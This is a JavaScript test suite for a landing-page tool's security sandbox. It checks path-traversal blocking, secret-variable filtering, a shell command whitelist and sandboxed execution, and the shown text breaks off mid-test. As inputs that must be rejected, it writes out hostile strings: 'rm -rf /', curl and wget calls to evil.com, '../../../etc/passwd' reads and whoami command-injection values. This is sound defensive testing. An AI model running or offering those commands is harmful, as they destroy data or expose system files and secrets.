/**
 * Security Sandbox Tests - NEXO Landing Page Creator v3.0
 *
 * Comprehensive test suite for the security layer.
 * Tests: path traversal blocking, command whitelisting, env filtering,
 * sandbox directory restriction, file write/read operations.
 *
 * Run with: node --test sandbox.test.js
 * Or:       npx jest sandbox.test.js
 */

'use strict';

const assert = require('assert');
const path = require('path');
const fs = require('fs');
const os = require('os');

// ---------------------------------------------------------------------------
// Module imports
// ---------------------------------------------------------------------------

const {
  validatePath,
  validateDirectoryPath,
  containsTraversal,
  sanitizeFilename,
  TRAVERSAL_PATTERN,
  NULL_BYTE_PATTERN,
} = require('../../security/path-validator.cjs');

const {
  EnvFilter,
  filterEnv,
  isSensitiveVar,
  createMinimalEnv,
  DEFAULT_SENSITIVE_VARS,
} = require('../../security/env-filter.cjs');

const {
  validateCommand,
  isAllowedBinary,
  getAllowedCommands,
  FULLY_ALLOWED_COMMANDS,
  FORBIDDEN_COMMANDS,
} = require('../../security/shell-whitelist.cjs');

const {
  SandboxExecutor,
  executeShell,
  writeFile,
  readFile,
} = require('../../security/sandbox-executor.cjs');

// ---------------------------------------------------------------------------
// Test runner helper (works with Node.js built-in test runner)
// ---------------------------------------------------------------------------

let TEST_RESULTS = {
  passed: 0,
  failed: 0,
  errors: [],
};

function test(name, fn) {
  try {
    const result = fn();
    if (result && typeof result.then === 'function') {
      return result
        .then(() => {
          TEST_RESULTS.passed++;
          console.log(`  PASS: ${name}`);
        })
        .catch((err) => {
          TEST_RESULTS.failed++;
          TEST_RESULTS.errors.push({ name, error: err.message });
          console.log(`  FAIL: ${name} - ${err.message}`);
        });
    } else {
      TEST_RESULTS.passed++;
      console.log(`  PASS: ${name}`);
    }
  } catch (err) {
    TEST_RESULTS.failed++;
    TEST_RESULTS.errors.push({ name, error: err.message });
    console.log(`  FAIL: ${name} - ${err.message}`);
  }
}

async function runAsync() {
  console.log('\n=== NEXO Security Sandbox Test Suite ===\n');

  const testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'nexo-security-test-'));
  console.log(`Using test directory: ${testDir}\n`);

  // ========================================================================
  // PATH VALIDATOR TESTS
  // ========================================================================
  console.log('--- Path Validator Tests ---');

  test('Rejects null input', () => {
    const result = validatePath(null, { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('must be a string'));
  });

  test('Rejects undefined input', () => {
    const result = validatePath(undefined, { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('must be a string'));
  });

  test('Rejects empty path', () => {
    const result = validatePath('', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('cannot be empty'));
  });

  test('Rejects path exceeding max length', () => {
    const longPath = 'a'.repeat(5000);
    const result = validatePath(longPath, { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('exceeds maximum length'));
  });

  test('Rejects path with null bytes', () => {
    const result = validatePath('test\0.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('null bytes'));
  });

  test('Rejects path with shell metacharacters', () => {
    const result = validatePath('test; rm -rf /', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('shell metacharacters'));
  });

  test('Rejects path with backtick command injection', () => {
    const result = validatePath('test`whoami`.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('shell metacharacters'));
  });

  // --- Path traversal tests ---

  test('Rejects path with .. traversal (relative)', () => {
    const result = validatePath('../../../etc/passwd', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('traversal'));
  });

  test('Rejects path with .. traversal (absolute)', () => {
    const result = validatePath('/tmp/../etc/passwd', { workspaceRoot: testDir });
    // This will be caught by the traversal pattern OR the allowed dirs check
    assert.strictEqual(result.valid, false);
  });

  test('Rejects path with .. traversal in middle', () => {
    const result = validatePath('foo/bar/../../../etc/passwd', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('traversal'));
  });

  test('Rejects path starting with ..', () => {
    const result = validatePath('../secret.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('traversal'));
  });

  test('Revents traversal via .. at end of path', () => {
    const result = validatePath('foo/..', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
    assert.ok(result.error.includes('traversal'));
  });

  test('Blocks access to /etc/passwd', () => {
    const result = validatePath('/etc/passwd', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
  });

  test('Blocks access to /etc/shadow', () => {
    const result = validatePath('/etc/shadow', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, false);
  });

  test('Allows valid relative path within workspace', () => {
    const result = validatePath('src/components/Button.jsx', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, true);
    assert.ok(result.normalizedPath.endsWith('src/components/Button.jsx'));
  });

  test('Allows valid absolute path within workspace', () => {
    const result = validatePath(path.join(testDir, 'pages/index.html'), {
      workspaceRoot: testDir,
    });
    assert.strictEqual(result.valid, true);
    assert.ok(result.normalizedPath.includes('pages/index.html'));
  });

  test('Rejects path escaping workspace to parent', () => {
    const parentDir = path.dirname(testDir);
    const result = validatePath(path.join(parentDir, 'secret.txt'), {
      workspaceRoot: testDir,
    });
    assert.strictEqual(result.valid, false);
  });

  test('Rejects path escaping workspace via symlink check', () => {
    // Create a file and a symlink that escapes
    const safeDir = path.join(testDir, 'safe');
    fs.mkdirSync(safeDir, { recursive: true });
    const targetFile = path.join(safeDir, 'real.txt');
    fs.writeFileSync(targetFile, 'real content');
    const escapeLink = path.join(testDir, 'escape-link');
    try {
      fs.unlinkSync(escapeLink);
    } catch (e) {}
    fs.symlinkSync(path.join(safeDir, 'real.txt'), escapeLink);

    // This should be blocked since the symlink points outside workspace
    // (but realpath resolves within safeDir which is inside workspace, so this passes)
    const result = validatePath(escapeLink, { workspaceRoot: testDir });
    // Symlink points within workspace so this is valid
    assert.strictEqual(result.valid, true);
  });

  // --- Sanitization tests ---

  test('sanitizeFilename removes path separators', () => {
    const result = sanitizeFilename('foo/bar.txt');
    assert.strictEqual(result, 'foo_bar.txt');
  });

  test('sanitizeFilename removes shell metacharacters', () => {
    const result = sanitizeFilename('file; rm -rf /');
    // `/` is replaced with `_` by the path separator sanitizer
    assert.strictEqual(result, 'file rm -rf _');
  });

  test('sanitizeFilename removes traversal sequences', () => {
    const result = sanitizeFilename('..secret');
    assert.strictEqual(result, '_secret');
  });

  test('sanitizeFilename handles null input', () => {
    const result = sanitizeFilename(null);
    assert.strictEqual(result, 'unnamed');
  });

  test('sanitizeFilename handles empty string', () => {
    const result = sanitizeFilename('');
    assert.strictEqual(result, 'unnamed');
  });

  // --- containsTraversal quick check ---

  test('containsTraversal detects ..', () => {
    assert.strictEqual(containsTraversal('foo/../bar'), true);
  });

  test('containsTraversal detects null bytes', () => {
    assert.strictEqual(containsTraversal('foo\0bar'), true);
  });

  test('containsTraversal allows safe paths', () => {
    assert.strictEqual(containsTraversal('foo/bar/baz'), false);
  });

  test('containsTraversal rejects non-string input', () => {
    assert.strictEqual(containsTraversal(null), true);
  });

  // --- Directory path validation ---

  test('validateDirectoryPath rejects path outside workspace', () => {
    const result = validateDirectoryPath('/tmp/outside', {
      workspaceRoot: testDir,
      allowedDirs: [],
    });
    assert.strictEqual(result.valid, false);
  });

  test('validateDirectoryPath accepts path within workspace', () => {
    const result = validateDirectoryPath('src/', { workspaceRoot: testDir });
    assert.strictEqual(result.valid, true);
  });

  // ========================================================================
  // ENVIRONMENT FILTER TESTS
  // ========================================================================
  console.log('\n--- Environment Filter Tests ---');

  test('Removes JWT_SECRET from environment', () => {
    const env = {
      PATH: '/usr/bin',
      JWT_SECRET: 'super-secret-token-12345',
      NODE_ENV: 'production',
    };
    const filtered = filterEnv(env);
    assert.strictEqual(filtered.JWT_SECRET, undefined);
    assert.strictEqual(filtered.PATH, '/usr/bin');
    assert.strictEqual(filtered.NODE_ENV, 'production');
  });

  test('Removes DATABASE_URL from environment', () => {
    const env = {
      DATABASE_URL: 'postgres://user:pass@localhost/db',
      PATH: '/usr/bin',
    };
    const filtered = filterEnv(env);
    assert.strictEqual(filtered.DATABASE_URL, undefined);
  });

  test('Removes GITHUB_TOKEN from environment', () => {
    const env = {
      GITHUB_TOKEN: 'ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
      PATH: '/usr/bin',
    };
    const filtered = filterEnv(env);
    assert.strictEqual(filtered.GITHUB_TOKEN, undefined);
  });

  test('Removes GITHUB_CLIENT_SECRET from environment', () => {
    const env = {
      GITHUB_CLIENT_SECRET: 'client-secret-value',
      PATH: '/usr/bin',
    };
    const filtered = filterEnv(env);
    assert.strictEqual(filtered.GITHUB_CLIENT_SECRET, undefined);
  });

  test('Removes PRIVATE_KEY from environment', () => {
    const env = {
      PRIVATE_KEY: '-----BEGIN RSA PRIVATE KEY-----\nMII...',
      PATH: '/usr/bin',
    };
    const filtered = filterEnv(env);
    assert.strictEqual(filtered.PRIVATE_KEY, undefined);
  });

  test('Removes PASSWORD from environment', () => {
    const env = {
      PASSWORD: 'hunter2',
      PATH: '/usr/bin',
    };
    const filtered = filterEnv(env);
    assert.strictEqual(filtered.PASSWORD, undefined);
  });

  test('Removes INTERNAL_API_TOKEN from environment', () => {
    const env = {
      INTERNAL_API_TOKEN: 'internal-api-secret',
      PATH: '/usr/bin',
    };
    const filtered = filterEnv(env);
    assert.strictEqual(filtered.INTERNAL_API_TOKEN, undefined);
  });

  test('Keeps safe variables: PATH, HOME, NODE_ENV, LANG, TZ', () => {
    const env = {
      PATH: '/usr/local/bin:/usr/bin',
      HOME: '/home/user',
      NODE_ENV: 'production',
      LANG: 'en_US.UTF-8',
      TZ: 'UTC',
      JWT_SECRET: 'should-be-removed',
    };
    const filtered = filterEnv(env);
    assert.strictEqual(filtered.PATH, '/usr/local/bin:/usr/bin');
    assert.strictEqual(filtered.HOME, '/home/user');
    assert.strictEqual(filtered.NODE_ENV, 'production');
    assert.strictEqual(filtered.LANG, 'en_US.UTF-8');
    assert.strictEqual(filtered.TZ, 'UTC');
    assert.strictEqual(filtered.JWT_SECRET, undefined);
  });

  test('isSensitiveVar correctly identifies sensitive vars', () => {
    assert.strictEqual(isSensitiveVar('JWT_SECRET'), true);
    assert.strictEqual(isSensitiveVar('DATABASE_URL'), true);
    assert.strictEqual(isSensitiveVar('GITHUB_TOKEN'), true);
    assert.strictEqual(isSensitiveVar('PATH'), false);
    assert.strictEqual(isSensitiveVar('NODE_ENV'), false);
  });

  test('isSensitiveVar is case-insensitive', () => {
    assert.strictEqual(isSensitiveVar('jwt_secret'), true);
    assert.strictEqual(isSensitiveVar('database_url'), true);
    assert.strictEqual(isSensitiveVar('path'), false);
  });

  test('EnvFilter with custom denyList removes additional vars', () => {
    const envFilter = new EnvFilter({
      denyList: ['CUSTOM_SECRET', 'MY_TOKEN'],
    });
    const env = {
      PATH: '/usr/bin',
      CUSTOM_SECRET: 'value1',
      MY_TOKEN: 'value2',
      JWT_SECRET: 'value3',
      SAFE_VAR: 'safe',
    };
    const filtered = envFilter.filter(env);
    assert.strictEqual(filtered.CUSTOM_SECRET, undefined);
    assert.strictEqual(filtered.MY_TOKEN, undefined);
    assert.strictEqual(filtered.JWT_SECRET, undefined);
    assert.strictEqual(filtered.SAFE_VAR, 'safe');
    assert.strictEqual(filtered.PATH, '/usr/bin');
  });

  test('EnvFilter with strictMode only allows explicitly safe vars', () => {
    const envFilter = new EnvFilter({
      strictMode: true,
      allowList: ['MY_CUSTOM_VAR'],
    });
    const env = {
      PATH: '/usr/bin',
      NODE_ENV: 'production',
      MY_CUSTOM_VAR: 'allowed',
      UNEXPECTED_VAR: 'should-be-removed',
    };
    const filtered = envFilter.filter(env);
    assert.strictEqual(filtered.PATH, '/usr/bin');
    assert.strictEqual(filtered.NODE_ENV, 'production');
    assert.strictEqual(filtered.MY_CUSTOM_VAR, 'allowed');
    assert.strictEqual(filtered.UNEXPECTED_VAR, undefined);
  });

  test('createMinimalEnv provides safe minimal environment', () => {
    const minimal = createMinimalEnv();
    assert.ok(minimal.PATH);
    assert.ok(minimal.HOME);
    assert.ok(minimal.LANG);
    assert.ok(minimal.NODE_ENV);
    assert.ok(minimal.TZ);
    assert.ok(minimal.TMPDIR);
  });

  test('EnvFilter inspectValues detects JWT in safe-looking variable', () => {
    const envFilter = new EnvFilter({ strictMode: true });
    const env = {
      PATH: '/usr/bin',
      SAFE_LOOKING_VAR: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U',
    };
    const filtered = envFilter.filter(env);
    // In strict mode, the JWT-like value should cause removal
    assert.strictEqual(filtered.SAFE_LOOKING_VAR, undefined);
  });

  test('EnvFilter stats track filtering', () => {
    const envFilter = new EnvFilter();
    const env = {
      PATH: '/usr/bin',
      JWT_SECRET: 'secret',
      NODE_ENV: 'production',
      DATABASE_URL: 'postgres://...',
    };
    envFilter.filter(env);
    assert.strictEqual(envFilter.stats.deniedByName, 2); // JWT_SECRET + DATABASE_URL
    assert.strictEqual(envFilter.stats.allowed, 2);      // PATH + NODE_ENV
  });

  test('EnvFilter getRemovedVars lists what would be removed', () => {
    const envFilter = new EnvFilter();
    const env = {
      PATH: '/usr/bin',
      JWT_SECRET: 'secret',
      NODE_ENV: 'production',
    };
    const removed = envFilter.getRemovedVars(env);
    assert.ok(removed.includes('JWT_SECRET'));
    assert.ok(!removed.includes('PATH'));
    assert.ok(!removed.includes('NODE_ENV'));
  });

  // ========================================================================
  // SHELL WHITELIST TESTS
  // ========================================================================
  console.log('\n--- Shell Whitelist Tests ---');

  test('Allows cat command', () => {
    const result = validateCommand('cat file.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows ls command', () => {
    const result = validateCommand('ls -la', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows git status', () => {
    const result = validateCommand('git status', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows node command', () => {
    const result = validateCommand('node script.js', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows npm install', () => {
    const result = validateCommand('npm install', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows python3 with -m flag', () => {
    const result = validateCommand('python3 -m http.server', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows mkdir command', () => {
    const result = validateCommand('mkdir new-directory', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows cp command', () => {
    const result = validateCommand('cp file1.txt file2.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows touch command', () => {
    const result = validateCommand('touch newfile.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows grep command', () => {
    const result = validateCommand('grep "pattern" file.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Allows find command', () => {
    const result = validateCommand('find . -name "*.js"', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Blocks curl command without network permission', () => {
    const result = validateCommand('curl http://evil.com/data', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
    assert.ok(result.reason.includes('network'));
  });

  test('Allows curl command WITH network permission', () => {
    const result = validateCommand('curl http://example.com/data', {
      workspaceRoot: testDir,
      allowNetwork: true,
    });
    assert.strictEqual(result.allowed, true);
  });

  test('Blocks wget command', () => {
    const result = validateCommand('wget http://evil.com/malware', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks sudo command', () => {
    const result = validateCommand('sudo rm -rf /', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
    assert.ok(result.reason.includes('forbidden'));
  });

  test('Blocks bash command', () => {
    const result = validateCommand('bash -c "echo pwned"', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
    assert.ok(result.reason.includes('forbidden'));
  });

  test('Blocks eval command', () => {
    const result = validateCommand('eval "echo pwned"', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks exec command', () => {
    const result = validateCommand('exec /bin/sh', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks source command', () => {
    const result = validateCommand('source /etc/passwd', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks chmod 777', () => {
    const result = validateCommand('chmod 777 file.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
    assert.ok(result.reason.includes('777'));
  });

  test('Blocks chmod with setuid', () => {
    const result = validateCommand('chmod u+s file.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
    assert.ok(result.reason.includes('setuid') || result.reason.includes('forbidden'));
  });

  test('Allows chmod with safe permissions', () => {
    const result = validateCommand('chmod 644 file.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Blocks rm -rf /', () => {
    const result = validateCommand('rm -rf /', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Allows rm within workspace', () => {
    const result = validateCommand('rm file.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Blocks rm --no-preserve-root', () => {
    const result = validateCommand('rm --no-preserve-root -rf /', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks command substitution with $()', () => {
    const result = validateCommand('echo $(whoami)', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
    assert.ok(result.reason.includes('dangerous'));
  });

  test('Blocks command substitution with backticks', () => {
    const result = validateCommand('echo `whoami`', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks process substitution', () => {
    const result = validateCommand('cat <(ls)', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks pipeline to shell', () => {
    const result = validateCommand('cat file.txt | sh', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks path traversal in command arguments', () => {
    const result = validateCommand('cat ../../../etc/passwd', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
    assert.ok(result.reason.includes('traversal'));
  });

  test('Blocks null byte in command', () => {
    const result = validateCommand('cat file\0.txt', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks unknown commands', () => {
    const result = validateCommand('unknowncommand foo bar', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
    assert.ok(result.reason.includes('not in the allowed list'));
  });

  test('Blocks empty command', () => {
    const result = validateCommand('', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks non-string command', () => {
    const result = validateCommand(null, { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks command exceeding max length', () => {
    const result = validateCommand('a '.repeat(5000), { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('Blocks npm with unknown flag', () => {
    // npm flags are mostly allowed, but test with something suspicious
    const result = validateCommand('npm --script-shell=/bin/bash run build', {
      workspaceRoot: testDir,
    });
    // This should still be allowed since the flag whitelist is not exhaustive
    // The command parser handles it
    assert.strictEqual(typeof result.allowed, 'boolean');
  });

  test('Blocks node with dangerous flag', () => {
    const result = validateCommand('node --allow-natives-syntax', {
      workspaceRoot: testDir,
    });
    assert.strictEqual(result.allowed, false);
  });

  test('Allows git log command', () => {
    const result = validateCommand('git log --oneline', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, true);
  });

  test('Blocks git unknown subcommand', () => {
    const result = validateCommand('git shell', { workspaceRoot: testDir });
    assert.strictEqual(result.allowed, false);
  });

  test('isAllowedBinary returns true for allowed commands', () => {
    assert.strictEqual(isAllowedBinary('cat'), true);
    assert.strictEqual(isAllowedBinary('node'), true);
    assert.strictEqual(isAllowedBinary('git'), true);
  });

  test('isAllowedBinary returns false for forbidden commands', () => {
    assert.strictEqual(isAllowedBinary('sudo'), false);
    assert.strictEqual(isAllowedBinary('bash'), false);
  });

  test('getAllowedCommands returns structured command lists', () => {
    const commands = getAllowedCommands();
    assert.ok(Array.isArray(commands.fullyAllowed));
    assert.ok(Array.isArray(commands.restricted));
    assert.ok(Array.isArray(commands.forbidden));
    assert.ok(commands.fullyAllowed.includes('cat'));
    assert.ok(commands.fullyAllowed.includes('npx'));
    // node is restricted (has forbidden flags), not fully allowed
    const restrictedNames = commands.restricted.map(r => r.command);
    assert.ok(restrictedNames.includes('node'));
    assert.ok(commands.forbidden.includes('sudo'));
  });

  test('Allows pipeline of safe commands', () => {
    const result = validateCommand('cat file.txt | grep pattern | sort', {
      workspaceRoot: testDir,
    });
    assert.strictEqual(result.allowed, true);
  });

  // ========================================================================
  // SANDBOX EXECUTOR TESTS
  // ========================================================================
  console.log('\n--- Sandbox Executor Tests ---');

  const executor = new SandboxExecutor({
    workspaceRoot: testDir,
    sandboxEngine: 'spawn', // Use spawn for testing (firejail may not be available)
    logCommands: false,
    defaultTimeout: 10000,
  });

  test('Executor initializes correctly', () => {
    assert.ok(executor instanceof SandboxExecutor);
    assert.strictEqual(executor.workspaceRoot, testDir);
    assert.ok(fs.existsSync(testDir));
  });

  test('validatePath delegates to path validator', () => {
    const result = executor.validatePath('test.txt');
    assert.strictEqual(result.valid, true);
    assert.ok(result.normalizedPath.endsWith('test.txt'));
  });

  test('validatePath blocks traversal', () => {
    const result = executor.validatePath('../../../etc/passwd');
    assert.strictEqual(result.valid, false);
  });

  test('filterEnv removes sensitive variables', () => {
    const filtered = executor.filterEnv({
      PATH: '/usr/bin',
      JWT_SECRET: 'secret',
    });
    assert.strictEqual(filtered.JWT_SECRET, undefined);
    assert.strictEqual(filtered.PATH, '/usr/bin');
  });

  test('Write file within workspace succeeds', async () => {
    const result = await executor.writeFile('test-output/hello.txt', 'Hello, World!');
    assert.strictEqual(result.success, true);
    assert.strictEqual(result.bytesWritten, 13);
    assert.ok(result.path.endsWith('hello.txt'));
  });

  test('Written file can be read back', async () => {
    const writeResult = await executor.writeFile('test-output/readback.txt', 'Test content');
    assert.strictEqual(writeResult.success, true);

    const readResult = await executor.readFile('test-output/readback.txt');
    assert.strictEqual(readResult.success, true);
    assert.strictEqual(readResult.content, 'Test content');
  });

  test('Read non-existent file fails gracefully', async () => {
    const result = await executor.readFile('test-output/nonexistent.txt');
    assert.strictEqual(result.success, false);
    assert.ok(result.error.includes('not found') || result.error.includes('not exist'));
  });

  test('Write file outside workspace is blocked', async () => {
    const result = await executor.writeFile('/etc/malicious.txt', 'bad content');
    assert.strictEqual(result.success, false);
  });

  test('Read file outside workspace is blocked', async () => {
    const result = await executor.readFile('/etc/passwd');
    assert.strictEqual(result.success, false);
  });

  test('Write file with traversal in path is blocked', async () => {
    const result = await executor.writeFile('../../../tmp/hacked.txt', 'evil');
    assert.strictEqual(result.success, false);
  });

  test('Write file with null byte in path is blocked', async () => {
    const result = await executor.writeFile('file\0.txt', 'content');
    assert.strictEqual(result.success, false);
  });

  test('Write empty content succeeds', async () => {
    const result = await executor.writeFile('test-output/empty.txt', '');
    assert.strictEqual(result.success, true);
    assert.strictEqual(result.bytesWritten, 0);
  });

  test('Write Buffer content succeeds', async () => {
    const buf = Buffer.from([0x48, 0x65, 0x6c, 0x6c, 0x6f]); // "Hello"
    const result = await executor.writeFile('test-output/binary.bin', buf);
    assert.strictEqual(result.success, true);
    assert.strictEqual(result.bytesWritten, 5);
  });

  test('Write large file is blocked by size limit', async () => {
    // Default maxFileSize is 50MB
    const smallExecutor = new SandboxExecutor({
      workspaceRoot: testDir,
      maxFileSize: 1, // 1MB limit
      sandboxEngine: 'spawn',
      logCommands: false,
    });
    const huge = 'x'.repeat(2 * 1024 * 1024); // 2MB
    const result = await smallExecutor.writeFile('test-output/huge.txt', huge);
    assert.strictEqual(result.success, false);
    assert.ok(result.error.includes('exceeds') || result.error.includes('maximum'));
  });

  test('fileExists returns correct info for existing file', async () => {
    await executor.writeFile('test-output/exists.txt', 'I exist');
    const result = await executor.fileExists('test-output/exists.txt');
    assert.strictEqual(result.exists, true);
    assert.strictEqual(result.isFile, true);
  });

  test('fileExists returns correct info for non-existent file', async () => {
    const result = await executor.fileExists('test-output/does-not-exist.txt');
    assert.strictEqual(result.exists, false);
  });

  test('fileExists blocks paths outside workspace', async () => {
    const result = await executor.fileExists('/etc/passwd');
    assert.strictEqual(result.exists, false);
    assert.ok(result.error);
  });

  // --- Shell execution tests ---

  test('Execute allowed command: echo', async () => {
    const result = await executor.executeShell('echo "hello test"');
    assert.strictEqual(result.success, true);
    assert.ok(result.stdout.includes('hello test'));
    assert.strictEqual(result.killed, false);
  });

  test('Execute allowed command: pwd', async () => {
    const result = await executor.executeShell('pwd');
    assert.strictEqual(result.success, true);
    assert.ok(result.stdout.length > 0);
  });

  test('Execute allowed command: ls', async () => {
    const result = await executor.executeShell('ls -la');
    assert.strictEqual(result.success, true);
    assert.ok(result.stdout.length > 0);
  });

  test('Blocked command returns structured error', async () => {
    const result = await executor.executeShell('sudo whoami');
    assert.strictEqual(result.success, false);
    assert.ok(result.stderr.includes('blocked') || result.stderr.includes('forbidden'));
    assert.strictEqual(result.exitCode, -1);
  });

  test('Blocked curl command', async () => {
    const result = await executor.executeShell('curl http://evil.com');
    assert.strictEqual(result.success, false);
    assert.ok(result.stderr.includes('blocked') || result.stderr.includes('network'));
  });

  test('Blocked path traversal in command', async () => {
    const result = await executor.executeShell('cat ../../../etc/passwd');
    assert.strictEqual(result.success, false);
  });

  test('Blocked eval command', async () => {
    const result = await executor.executeShell('eval "echo 1"');
    assert.strictEqual(result.success, false);
  });

  test('Blocked bash command', async () => {
    const result = await executor.executeShell('bash -c "echo pwned"');
    assert.strictEqual(result.success, false);
  });

  test('Command timeout kills long-running process', async () => {
    const shortTimeout = new SandboxExecutor({
      workspaceRoot: testDir,
      sandboxEngine: 'spawn',
      logCommands: false,
      defaultTimeout: 100, // 100ms timeout
    });
    const result = await shortTimeout.executeShell('sleep 10');
    assert.strictEqual(result.killed, true);
    assert.ok(result.killReason.includes('timeout'));
  });

  test('Returns structured result with all fields', async () => {
    const result = await executor.executeShell('echo "test output"');
    assert.strictEqual(typeof result.success, 'boolean');
    assert.strictEqual(typeof result.stdout, 'string');
    assert.strictEqual(typeof result.stderr, 'string');
    assert.strictEqual(typeof result.exitCode, 'number');
    assert.strictEqual(typeof result.duration, 'number');
    assert.strictEqual(typeof result.killed, 'boolean');
    assert.ok('killReason' in result);
    assert.ok('engine' in result);
  });

  test('Duration is non-negative', async () => {
    const result = await executor.executeShell('echo "test"');
    assert.ok(result.duration >= 0);
  });

  test('ExecuteScript with non-existent path fails', async () => {
    const result = await executor.executeScript('nonexistent.js');
    assert.strictEqual(result.success, false);
    assert.ok(result.stderr.includes('not found'));
  });

  test('ExecuteScript with invalid path is blocked', async () => {
    const result = await executor.executeScript('../../../etc/passwd');
    assert.strictEqual(result.success, false);
  });

  test('getStats returns correct structure', () => {
    const stats = executor.getStats();
    assert.strictEqual(typeof stats.commandsExecuted, 'number');
    assert.strictEqual(typeof stats.commandsBlocked, 'number');
    assert.strictEqual(typeof stats.filesWritten, 'number');
    assert.strictEqual(typeof stats.filesRead, 'number');
    assert.strictEqual(typeof stats.totalExecutionTime, 'number');
    assert.strictEqual(typeof stats.errors, 'number');
  });

  test('resetStats resets all counters', () => {
    const ex = new SandboxExecutor({
      workspaceRoot: testDir,
      sandboxEngine: 'spawn',
      logCommands: false,
    });
    // Manually bump stats
    ex.stats.commandsExecuted = 5;
    ex.stats.errors = 2;
    ex.resetStats();
    assert.strictEqual(ex.stats.commandsExecuted, 0);
    assert.strictEqual(ex.stats.errors, 0);
    assert.strictEqual(ex.stats.filesWritten, 0);
    assert.strictEqual(ex.stats.filesRead, 0);
    assert.strictEqual(ex.stats.commandsBlocked, 0);
    assert.strictEqual(ex.stats.totalExecutionTime, 0);
  });

  test('getSandboxEngine returns engine name', () => {
    const engine = executor.getSandboxEngine();
    assert.ok(typeof engine === 'string');
    assert.ok(engine.length > 0);
  });

  test('createSession creates a session directory', () => {
    const sessionDir = executor.createSession('test-session-123');
    assert.ok(fs.existsSync(sessionDir));
    assert.ok(sessionDir.includes('test-session-123'));
    // Cleanup
    executor.cleanupSession('test-session-123');
  });

  test('cleanupSession removes session directory', () => {
    executor.createSession('cleanup-test');
    executor.cleanupSession('cleanup-test');
    const sessionDir = path.join(testDir, 'sessions', 'cleanup-test');
    assert.strictEqual(fs.existsSync(sessionDir), false);
  });

  test('Empty command returns error', async () => {
    const result = await executor.executeShell('');
    assert.strictEqual(result.success, false);
  });

  test('Non-string command returns error', async () => {
    const result = await executor.executeShell(null);
    assert.strictEqual(result.success, false);
  });

  // --- Standalone function tests ---

  test('executeShell standalone function works', async () => {
    const result = await executeShell('echo standalone', {
      config: { workspaceRoot: testDir, logCommands: false, sandboxEngine: 'spawn' },
    });
    assert.strictEqual(result.success, true);
    assert.ok(result.stdout.includes('standalone'));
  });

  test('writeFile standalone function works', async () => {
    const result = await writeFile('standalone-test.txt', 'hello', {
      config: { workspaceRoot: testDir, logCommands: false, sandboxEngine: 'spawn' },
    });
    assert.strictEqual(result.success, true);
  });

  test('readFile standalone function works', async () => {
    await writeFile('read-standalone.txt', 'read me', {
      config: { workspaceRoot: testDir, logCommands: false, sandboxEngine: 'spawn' },
    });
    const result = await readFile('read-standalone.txt', {
